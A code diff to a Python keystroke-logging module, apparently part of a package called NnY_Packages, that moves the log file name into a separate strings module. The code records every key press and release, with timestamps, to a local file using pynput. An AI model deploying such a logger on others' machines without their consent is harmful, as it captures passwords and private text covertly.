@@ -3,15 +3,15 @@ Written By	- Yeshwanth Reddy
 NnY_Packages
 """
 import datetime
-
+from Data import strings
 from pynput.keyboard import Listener as KListener
 
-Log_File_Name = 'DB/Logs/Key_Logs.txt'
+Log_File_Name_Keyboard = strings.Log_File_Name_Keyboard
 
 
 def on_press(key):  # this function is called whenever any key is pressed and key contains the value of key pressed
 	now = datetime.datetime.now()
-	f = open(Log_File_Name, 'a')
+	f = open(Log_File_Name_Keyboard, 'a')
 	log = "Keyboard _|_ Pressed _|_ " + str(key) + " _|_ " + str(now.hour) + ' _|_ ' + str(now.minute) + ' _|_ ' + str(
 		now.second) + ' _|_ ' + str(now.microsecond) + '\n'
 	# print(log)
@@ -21,7 +21,7 @@ def on_press(key):  # this function is called whenever any key is pressed and ke
 
 def on_release(key):  # this function is called whenever any key is RELEASED and key contains the value of key RELEASED
 	now = datetime.datetime.now()
-	f = open(Log_File_Name, 'a')
+	f = open(Log_File_Name_Keyboard, 'a')
 	log = "Keyboard _|_ Released _|_ " + str(key) + " _|_ " + str(now.hour) + " _|_ " + str(now.minute) + ' _|_ ' + str(
 		now.second) + ' _|_ ' + str(now.microsecond) + '\n'
 	# print(log)
